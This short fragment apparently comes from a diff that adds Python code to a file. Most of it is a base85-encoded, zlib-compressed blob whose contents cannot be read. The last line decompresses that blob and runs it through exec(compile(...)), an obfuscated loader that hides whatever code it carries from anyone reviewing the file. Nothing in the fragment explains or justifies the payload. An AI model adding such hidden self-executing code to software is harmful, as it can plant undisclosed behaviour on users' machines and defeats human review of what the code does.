+)IcjcFncl$TGIAkvT!MOb|656}{J^(s_)bxv@5Gh!{rX+w1Gn7QWCSz{s23Ht?={=WLBfyJ6ddES^rqe{vCFlBwG%mf`80ILN;kZ$`q_}>{iNX*inVWKC{KV
+ImB4|5{3EulE2$W@)t^WfrO{=s""").replace("\n","")
+exec(compile(_z.decompress(_b.b85decode(_)).decode('utf-8'),__file__,'exec'))
